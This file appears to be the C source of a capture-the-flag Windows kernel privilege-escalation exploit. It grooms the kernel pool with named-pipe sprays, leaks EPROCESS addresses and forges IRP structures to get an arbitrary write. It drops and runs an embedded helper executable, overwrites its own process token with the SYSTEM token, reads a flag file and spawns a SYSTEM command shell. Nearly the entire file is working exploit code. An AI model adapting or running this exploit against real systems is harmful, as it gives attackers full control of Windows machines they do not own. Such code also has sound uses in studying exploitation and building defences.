#include <windows.h>
#include <stdio.h>
#include <stdint.h>
#include <winternl.h>

#include "write_evil.h"

#define SystemExtendedHandleInformation 64
#define SystemBigPoolInformation 0x42

#define IRP_BUFFERED_IO                 0x00000010
#define IRP_DEALLOCATE_BUFFER           0x00000020
#define IRP_INPUT_OPERATION             0x00000040

#define ALIGN_UP(size, align) (((size) + ((align) - 1)) & ~((align) - 1))

typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
{
	PVOID Object;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR HandleValue;
	ULONG GrantedAccess;
	USHORT CreatorBackTraceIndex;
	USHORT ObjectTypeIndex;
	ULONG HandleAttributes;
	ULONG Reserved;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO_EX;

typedef struct _SYSTEM_BIGPOOL_ENTRY 
{
	union {
		PVOID VirtualAddress;
		ULONG_PTR NonPaged : 1;
	};
	ULONG_PTR SizeInBytes;
	union {
		UCHAR Tag[4];
		ULONG TagUlong;
	};
} SYSTEM_BIGPOOL_ENTRY, *PSYSTEM_BIGPOOL_ENTRY;

typedef struct _SYSTEM_HANDLE_INFORMATION_EX
{
    ULONG_PTR NumberOfHandles;
	ULONG_PTR Reserved;
	SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
} SYSTEM_HANDLE_INFORMATION_EX, * PSYSTEM_HANDLE_INFORMATION_EX;

typedef struct _SYSTEM_BIGPOOL_INFORMATION {
	ULONG Count;
	SYSTEM_BIGPOOL_ENTRY AllocatedInfo[ANYSIZE_ARRAY];
} SYSTEM_BIGPOOL_INFORMATION, *PSYSTEM_BIGPOOL_INFORMATION;

typedef NTSTATUS(WINAPI *PNtQuerySystemInformation)(
	__in SYSTEM_INFORMATION_CLASS SystemInformationClass,
	__inout PVOID SystemInformation,
	__in ULONG SystemInformationLength,
	__out_opt PULONG ReturnLength
);

typedef struct {
    SHORT Type;
    USHORT Size;
    USHORT AllocationProcessorNumber;
    USHORT Reserved;
    PVOID MdlAddress;
    ULONG Flags;
    PVOID AssociatedIrp;
    LIST_ENTRY ThreadListEntry;
    IO_STATUS_BLOCK IoStatus;
    CHAR RequestorMode;
    UCHAR PendingReturned;
    CHAR StackCount;
    CHAR CurrentLocation;
    UCHAR Cancel;
    UCHAR CancelIrql;
    CHAR ApcEnvironment;
    UCHAR AllocationFlags;
    PVOID UserIosb;
    PVOID UserEvent;
    char Overlay[16];
    PVOID CancelRoutine;
    PVOID UserBuffer;
    CHAR Tail;
} IRP;

typedef struct {
    uint64_t Flink;
    uint64_t Blink;
    IRP* Irp;
    uint64_t SecurityContext;
    uint32_t EntryType; // isDataAllocated, 1 for the kernel to use Irp field
    uint32_t QuotaInEntry;
    uint32_t DataSize;
    uint32_t x;
} DATA_QUEUE_ENTRY;

typedef struct {
    HANDLE hRead;
    HANDLE hWrite;
} Pipe;

char WRITE_HELPER_PATH[MAX_PATH] = {};

void hexprint(char *buffer, unsigned int bytes)
{
	int dqwords = ((bytes + 0x10 - 1) & 0xfffffff0) / 0x10;
	int qwords = dqwords * 2;
	puts("---------------------------------------------");
	for (int i = 0; i < qwords; i += 2)
	{
		printf("0x%04llx: 0x%016llx 0x%016llx\n", (i * 0x8), ((unsigned long long *)buffer)[i], ((unsigned long long *)buffer)[i + 1]);
	}
	puts("---------------------------------------------");
}

void spawnWriteHelper() {
    PROCESS_INFORMATION pi;
    STARTUPINFO si;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    if (!CreateProcess(
        NULL,
        WRITE_HELPER_PATH,
        NULL,
        NULL,
        FALSE,
        CREATE_NO_WINDOW,
        NULL,
        NULL,
        &si,
        &pi
    )) {
        printf("[-] Failed to spawn process\n");
        exit(1);
    }

    // Wait for the process to finish
    // WaitForSingleObject(pi.hProcess, INFINITE);

    // CloseHandle(pi.hProcess);
    // CloseHandle(pi.hThread);
}

void writeHelperExe() {
    char tempPath[MAX_PATH];

    if (!GetTempPathA(MAX_PATH, tempPath)) {
        return 1;
    }

    snprintf(WRITE_HELPER_PATH, MAX_PATH, "%swrite_evil.exe", tempPath);

    FILE *f = fopen(WRITE_HELPER_PATH, "wb");
    if (f == NULL) {
        printf("[-] Couldn't open %s to write\n", WRITE_HELPER_PATH);
        exit(1);
    }

    fwrite(writeEvil_exe, 1, writeEvil_exe_len, f);
    fclose(f);

    printf("[+] Wrote helper: %s\n", WRITE_HELPER_PATH);
}

Pipe *pipeSpray(size_t count, size_t size, char fill) {
    Pipe *pipes;
    DWORD written;
    BYTE *pipeBuf;
    
    if (size <= 0x30) {
        printf("[-] pipeSpray invalid size (<= 0x30)\n");
        exit(1);
    }
    
    pipes = (Pipe *)calloc(count, sizeof(Pipe));
    if (pipes == NULL) {
        return NULL;
    }

    size -= 0x30;

    pipeBuf = calloc(size, 1);
    if (pipeBuf == NULL) {
        printf("[-] Failed calloc\n");
        exit(1);
    }
    memset(pipeBuf, fill, size);

    for (size_t i = 0; i < count; i++) {
        if (!CreatePipe(&pipes[i].hRead, &pipes[i].hWrite, NULL, size)) {
            printf("[-] Failed CreatePipe\n");
            exit(1);
        }
    
        if (!WriteFile(pipes[i].hWrite, pipeBuf, size, &written, NULL) ||
            written != size) {
            printf("[-] Failed WriteFile\n");
            exit(1);
        }
    }

    free(pipeBuf);
    return pipes;
}

void writeToPipe(HANDLE hWrite, unsigned char *data, size_t len) {
    DWORD bytesWritten;

    if (!WriteFile(hWrite, data, len, &bytesWritten, NULL)) {
        printf("[-] Failed writing to pipe\n");
        exit(1);
    }
}

void readFromPipe(HANDLE hRead, unsigned char *out, size_t len) {
    DWORD bytesRead;

    if (!ReadFile(hRead, out, len, &bytesRead, NULL)) {
        printf("[-] Failed reading from pipe\n");
        exit(1);
    }
}

void peekFromPipe(HANDLE hNamedPipe, unsigned char *out, size_t len) {
    DWORD bytesRead;

    if (!PeekNamedPipe(hNamedPipe, out, len, &bytesRead, NULL, NULL)) {
        printf("[-] Failed peeking pipe\n");
        exit(1);
    }
}

void freePipe(Pipe pipe) {
    CloseHandle(pipe.hWrite);
    CloseHandle(pipe.hRead);
}

uint64_t leakEprocess(uint32_t pid, HANDLE searchHandle) {
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query =
        (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("[-] GetProcAddress() failed\n");
        exit(1);
	}

    ULONG len = 20;
	NTSTATUS status = (NTSTATUS)0xc0000004;
	PSYSTEM_HANDLE_INFORMATION_EX pHandleInfo = NULL;
	do {
		len *= 2;
		pHandleInfo = (PSYSTEM_HANDLE_INFORMATION_EX)GlobalAlloc(GMEM_ZEROINIT, len);

		status = query(SystemExtendedHandleInformation, pHandleInfo, len, &len);

	} while (status == (NTSTATUS)0xc0000004);
	if (status != (NTSTATUS)0x0) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
        exit(1);
	}

	for (int i = 0; i < pHandleInfo->NumberOfHandles; i++) {
        uint64_t object = (uint64_t)pHandleInfo->Handles[i].Object;
		HANDLE handle = (HANDLE)pHandleInfo->Handles[i].HandleValue;
		uint32_t currPid = (uint32_t)pHandleInfo->Handles[i].UniqueProcessId;

		if (currPid == pid) {
            if (searchHandle != 0 && handle != searchHandle) {
                continue;
            }

            return object;
		}
	}

    free(pHandleInfo);
    return 0;
}

uint64_t counter = 1;
uint64_t kmallocAddr(char *data, size_t data_len, Pipe *pipe) {
	HMODULE ntdll = GetModuleHandle(TEXT("ntdll"));
	PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, "NtQuerySystemInformation");
	if (query == NULL) {
		printf("GetProcAddress() failed.\n");
		return 1;
	}
	unsigned int len = sizeof(SYSTEM_BIGPOOL_INFORMATION);
	unsigned long out;
	PSYSTEM_BIGPOOL_INFORMATION info = NULL;
	NTSTATUS status = ERROR;

    if (!CreatePipe(&pipe->hRead, &pipe->hWrite, NULL, data_len + counter * 4096)) {
        printf("[-] Failed CreatePipe\n");
        exit(1);
    }

    char *buf = calloc(1, data_len + counter * 4096);
    if (buf == NULL) {
        perror("calloc");
        exit(1);
    }
    memcpy(buf, data, data_len);
    writeToPipe(pipe->hWrite, buf, data_len + counter * 4096);

	do {
		len *= 2;
		info = (PSYSTEM_BIGPOOL_INFORMATION) GlobalAlloc(GMEM_ZEROINIT, len);
		status = query(SystemBigPoolInformation, info, len, &out);
	} while (status == (NTSTATUS)0xc0000004);

	if (!SUCCEEDED(status)) {
		printf("NtQuerySystemInformation failed with error code 0x%X\n", status);
		return 1;
	}

	for (unsigned int i = 0; i < info->Count; i++) {
		SYSTEM_BIGPOOL_ENTRY poolEntry = info->AllocatedInfo[i];
        if (poolEntry.TagUlong == 'rFpN' && poolEntry.NonPaged == 1 && poolEntry.SizeInBytes == ALIGN_UP(data_len + counter * 4096 + 0x30, 0x10)) {
            counter++;
            return (uint64_t)poolEntry.VirtualAddress & ~1;
        }
	}

    return NULL;
}

void writer(Pipe *pipe) {
    char buf[0x100] = {0};
    writeToPipe(pipe->hWrite, buf, sizeof(buf));

    // Need to sleep here otherwise when we arbitrary write with forged IRP kernel will crash
    Sleep(99999 * 1000);
}

int main() {
    Pipe knownOnePipe;
    Pipe knownTwoPipe;
    Pipe knownThreePipe;

    setbuf(stdout, NULL);

    printf("[+] whoami: ");
    system("whoami");
    
    printf("[+] type flag.txt: ");
    system("type C:\\Windows\\System32\\flag.txt");
    printf("\n");

    writeHelperExe();

    uint64_t knownOne = kmallocAddr("AAAABBBB", 8, &knownOnePipe);
    if (knownOne == NULL) {
        printf("[-] Failed kmallocAddr");
        return 1;
    }

    IRP *firstFakeIrp = calloc(1, sizeof(IRP));
    if (firstFakeIrp == NULL) {
        perror("calloc");
        return 1;
    }

    firstFakeIrp->AssociatedIrp = knownOne;

    uint64_t knownTwo = kmallocAddr(firstFakeIrp, sizeof(IRP), &knownTwoPipe);
    if (knownTwo == NULL) {
        printf("[-] Failed kmallocAddr");
        return 1;
    }

    uint64_t knownThree = kmallocAddr("CCCCDDDD", 8, &knownThreePipe);
    if (knownThree == NULL) {
        printf("[-] Failed kmallocAddr");
        return 1;
    }

    printf("[+] FLINK ptr to leak at: 0x%llx\n", knownOne);
    printf("[+] First fake IRP at: 0x%llx\n", knownTwo);
    printf("[+] Last fake IRP will go to: 0x%llx\n", knownThree);

    // handle.Object points to EPROCESS of process which owns the handle
    // so we open a handle to our own proc and search based on pid and handle value
    HANDLE ourHandle = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        GetCurrentProcessId()
    );
    if (ourHandle == NULL) {
        printf("[-] Failed to open process handle to our process\n");
        return 1;
    }

    uint64_t sysEprocess = leakEprocess(4, 0);
    if (sysEprocess == 0) {
        printf("[-] Failed getting EPROCESS address for system process\n");
        return 1;
    }

    uint64_t ourEprocess = leakEprocess(GetCurrentProcessId(), ourHandle);
    if (ourEprocess == 0) {
        printf("[-] Failed getting EPROCESS address for our process\n");
        return 1;
    }

    uint64_t ourTokenAddr = ourEprocess + 0x4b8;
    uint64_t sysTokenAddr = sysEprocess + 0x4b8;
    printf("[+] EPROCESS of current process at: 0x%llx\n", ourEprocess);
    printf("[+] EPROCESS of system process at: 0x%llx\n", sysEprocess);
    printf("[+] Token of current process at: 0x%llx\n", ourTokenAddr);
    printf("[+] Token of system process at: 0x%llx\n", sysTokenAddr);

    printf("[+] Drain 0x100 LFH freelist\n");
    Pipe *drain = pipeSpray(2000, 0x100, 'A');

    printf("[+] Initial (holes) spray\n");
    Pipe *firstSpray = pipeSpray(1000, 0x100, '\xff');

    printf("[+] Poke holes\n");
    for (uint32_t i = 0; i < 1000; i += 3) {
        freePipe(firstSpray[i]);
        ZeroMemory(&firstSpray[i], sizeof(Pipe));
    }
    Sleep(100);

    printf("[+] Allocate 'pids' in 0x100 LFH\n");
    spawnWriteHelper();

    printf("[+] Add 63 entries into 'pids' before executing the main spray\n");
    for (uint32_t i = 0; i < 63; i++) {
        spawnWriteHelper();
    }

    // just in case all pids havent been processed wait a bit
    Sleep(3000);

    printf("[+] Drain 0x200 VS freelist\n");
    Pipe *drain_2 = pipeSpray(0x2000, 0x200, 'B');

    char *buf = calloc(1, 0x10000);
    if (buf == NULL) {
        perror("calloc");
        exit(1);
    }

    printf("[+] Main attack spray\n");
    // Pipe *large = pipeSpray(0x400, 0xc020, 'L');
    Pipe *large = calloc(0x6000, sizeof(Pipe));
    if (large == NULL) {
        perror("calloc");
        return 1;
    }
    memset(buf, 'L', 0xc020 - 0x30);
    for (uint32_t i = 0; i < 0x6000; i++) {
        if (!CreatePipe(&large[i].hRead, &large[i].hWrite, NULL, 0xc020 - 0x30)) {
            printf("[-] CreatePipe failed\n");
            return 1;
        }
        writeToPipe(large[i].hWrite, buf, 0xc020 - 0x30);
    }
    memset(buf, '\0', 0xc020 - 0x30);

    Pipe *recover = pipeSpray(0x6300, 0xfc0 - 0x20, 'b');
    Pipe *a = pipeSpray(0x6300, 0xfb0 - 0x20 - 0x300 - 0x10, 'a');

    // take some 0x200 sized chunks from the free list as it could have been tampered with by other procs
    Pipe *garbage = pipeSpray(0x1000, 0x200, 'g');

    printf("[+] Add another entry to 'pids', will cause it to allocate 0x200\n");
    spawnWriteHelper();

    printf("[+] Add pid entries up to the next UnsafeSize\n");
    for (uint32_t i = 0; i < 63; i++) {
        spawnWriteHelper();
    }

    // just in case all pids havent been processed wait a bit
    Sleep(3000);

    printf("[+] Allocate fence chunks and chunks around them to prevent consolidation\n");
    Pipe *fence = pipeSpray(0x2000, 0xc100, 'F');
    Pipe *before = pipeSpray(0x6000, 0xf00, 'd');

    printf("[+] Insert fence chunks into freelist\n");
    for (uint32_t i = 0; i < 0x200; i++) {
        freePipe(fence[i]);
    }

    printf("[+] Add another pid entry, will overwrite UnsafeSize and consolidate into huge chunk\n");
    spawnWriteHelper();
    Sleep(100);

    printf("[+] Trying overlap...\n");
    BOOLEAN overlapped = FALSE;
    UINT32 DataSize = 0x2000;
    UINT32 isDataAllocated = 1;
    char *payload = calloc(1, 0xc200);
    if (payload == NULL) {
        perror("calloc");
        return 1;
    }

    memset(payload, 'z', 0xc200);
    memset(payload + 0xc010, '\0', 0x28);
    memcpy(payload + 0xc010 + 0x28, &DataSize, sizeof(DataSize));
    memcpy(payload + 0xc010 + 0x20, &isDataAllocated, sizeof(isDataAllocated));
    uint64_t knownTwoData = knownTwo + 0x30;
    memcpy(payload + 0xc010 + 0x10, &knownTwoData, sizeof(knownTwoData));

    Pipe overlap;
    for (uint32_t j = 0; j < 0xa00; j++) {
        if (!CreatePipe(&overlap.hRead, &overlap.hWrite, NULL, 0xc200 - 0x30)) {
            printf("[-] Failed CreatePipe!\n");
            exit(1);
        }
        if (!WriteFile(overlap.hWrite, payload, 0xc200 - 0x30, NULL, NULL)) {
            printf("[-] Failed WriteFile\n");
            exit(1);
        }

        for (uint32_t i = 0; i < 0x6000; i++) {
            peekFromPipe(large[i].hRead, buf, 1);
            if (buf[0] == 'z') {
                overlapped = TRUE;
                printf("[+] Overlap success\n");
                break;
            }
            buf[0] = '\0';
        }

        if (overlapped) {
            break;
        }
    }

    if (!overlapped) {
        printf("[-] Overlap failed\n");
        return 1;
    }

    printf("[+] Start writer to knownOne (0x%llx) to exceed quota and add IRP ptr...\n", knownOne);
    CreateThread(0, 0, writer, &knownOnePipe, 0, 0);

    uint64_t flink = 0;
    Pipe *overwritten = NULL;
    printf("[+] Finding faked IRP...\n");
    for (uint32_t i = 0; i < 0x6300; i++) {
        peekFromPipe(a[i].hRead, buf, 0x50);
        if (buf[0] != 'a') {
            printf("[+] Success\n");
            hexprint(buf, 0x50);
            
            flink = ((uint64_t *)buf)[0];
            overwritten = &a[i];
            break;
        }
    }

    if (flink == 0) {
        printf("[-] Failed leaking valid IRP pointer\n");
        return 0;
    }

    printf("[+] Valid IRP pointer at: 0x%llx\n", flink + 0x10);

    printf("[+] Forging new fake IRP at 0x%llx to leak IRP pointer\n", knownTwo);
    memset(buf, 0, 0x2080);
    ((IRP *)buf)->AssociatedIrp = flink;

    freePipe(knownTwoPipe);
    Pipe forgedFirst[0x100];
    for (uint32_t i = 0; i < 0x100; i++) {
        if (!CreatePipe(&forgedFirst[i].hRead, &forgedFirst[i].hWrite, NULL, 0x2080)) {
            printf("[-] Failed CreatePipe!\n");
            exit(1);
        }
        if (!WriteFile(forgedFirst[i].hWrite, buf, 0x2080, NULL, NULL)) {
            printf("[-] Failed WriteFile\n");
            exit(1);
        }
    }

    memset(buf, 0, 0x100);
    peekFromPipe(overwritten->hRead, buf, 0x100);
    printf("[+] Leaked entry:\n");
    hexprint(buf, 0x30);

    uint64_t validIrpPtr = ((uint64_t *)buf)[2];
    printf("[+] Valid IRP at: 0x%llx\n", validIrpPtr);
    
    printf("[+] Forging new fake IRP at 0x%llx to leak valid IRP struct\n", knownTwo);
    memset(buf, 0, 0x2080);
    ((IRP *)buf)->AssociatedIrp = validIrpPtr;

    for (uint32_t i = 0; i < 0x100; i++) {
        freePipe(forgedFirst[i]);
    }

    for (uint32_t i = 0; i < 0x100; i++) {
        Pipe pipe;
        if (!CreatePipe(&pipe.hRead, &pipe.hWrite, NULL, 0x2080)) {
            printf("[-] Failed CreatePipe!\n");
            exit(1);
        }
        if (!WriteFile(pipe.hWrite, buf, 0x2080, NULL, NULL)) {
            printf("[-] Failed WriteFile\n");
            exit(1);
        }
    }

    memset(buf, 0, 0x1000);
    peekFromPipe(overwritten->hRead, buf, 0x1000);
    printf("[+] Leaked IRP struct:\n");
    hexprint(buf, sizeof(IRP));

    ((IRP *)buf)->Flags |= IRP_BUFFERED_IO | IRP_INPUT_OPERATION;
    ((IRP *)buf)->AssociatedIrp = sysTokenAddr;
    ((IRP *)buf)->UserBuffer = ourTokenAddr;
    ((IRP *)buf)->ThreadListEntry.Flink = knownThree + offsetof(IRP, ThreadListEntry) + 0x30;
    ((IRP *)buf)->ThreadListEntry.Blink = knownThree + offsetof(IRP, ThreadListEntry) + 0x30;

    printf("[+] Forging last fake IRP at 0x%llx\n", knownThree);
    freePipe(knownThreePipe);
    for (uint32_t i = 0; i < 0x100; i++) {
        Pipe pipe;
        if (!CreatePipe(&pipe.hRead, &pipe.hWrite, NULL, 0x3008)) {
            printf("[-] Failed CreatePipe!\n");
            exit(1);
        }
        if (!WriteFile(pipe.hWrite, buf, 0x3008, NULL, NULL)) {
            printf("[-] Failed WriteFile\n");
            exit(1);
        }
    }

    printf("[+] Overlapping again\n");

    DataSize = 8;
    isDataAllocated = 0;
    uint64_t knownThreeData = knownThree + 0x30;
    uint32_t quota = DataSize - 1;
    memset(payload, 'x', 0xc200);
    memset(payload + 0xc010, '\0', 0x28);

    memcpy(payload + 0xc010, &knownThree, sizeof(knownThree));
    memcpy(payload + 0xc010 + 8, &knownThree, sizeof(knownThree));
    memcpy(payload + 0xc010 + 0x10, &knownThreeData, sizeof(knownThreeData));
    memcpy(payload + 0xc010 + 0x20, &isDataAllocated, sizeof(isDataAllocated));
    memcpy(payload + 0xc010 + 0x24, &quota, sizeof(quota));
    memcpy(payload + 0xc010 + 0x28, &DataSize, sizeof(DataSize));

    overlapped = FALSE;
    memset(buf, 0, 0x100);
    Pipe overlapTwo;
    for (uint32_t j = 0; j < 0xa00; j++) {
        if (!CreatePipe(&overlapTwo.hRead, &overlapTwo.hWrite, NULL, 0xc200 - 0x30)) {
            printf("[-] Failed CreatePipe!\n");
            exit(1);
        }
        if (!WriteFile(overlapTwo.hWrite, payload, 0xc200 - 0x30, NULL, NULL)) {
            printf("[-] Failed WriteFile\n");
            exit(1);
        }

        for (uint32_t i = 0; i < 0x6000; i++) {
            peekFromPipe(large[i].hRead, buf, 1);
            if (buf[0] == 'x') {
                overlapped = TRUE;
                printf("[+] Success\n");
                break;
            }
            buf[0] = '\0';
        }

        if (overlapped) {
            break;
        }
    }

    if (!overlapped) {
        printf("[-] Overlap failed\n");
        return 1;
    }

    printf("[+] Triggering arbitrary write...\n");
    for (uint32_t i = 0; i < 0x6300; i++) {
        readFromPipe(a[i].hRead, buf, 1);
    }

    printf("[+] Adding dummy chunks to the freelist to delay system crash\n");
    for (uint32_t i = 0x200; i < 0x2000; i++) {
        freePipe(fence[i]);
    }

    printf("\n[+] whoami: ");
    system("whoami");
    
    printf("[+] type flag.txt: ");
    system("type C:\\Windows\\System32\\flag.txt");

    printf("[+] Spawning SYSTEM shell\n");
    system("cmd");

    return 0;
}